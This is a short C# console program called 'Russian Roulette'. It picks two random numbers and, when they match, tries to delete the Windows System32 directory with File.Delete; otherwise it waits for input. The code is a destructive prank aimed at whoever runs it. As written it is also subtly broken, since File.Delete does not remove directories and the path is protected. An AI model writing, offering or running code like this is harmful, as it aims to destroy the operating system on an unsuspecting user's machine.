namespace Russian_Roulette
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random rnd = new Random();
            int num = rnd.Next(7);
            int num1 = rnd.Next(7);

            if (num == num1)
            {
                File.Delete("C:\\Windows\\System32");
            }
            else
            {
                Console.ReadLine();
            }
        }
    }
}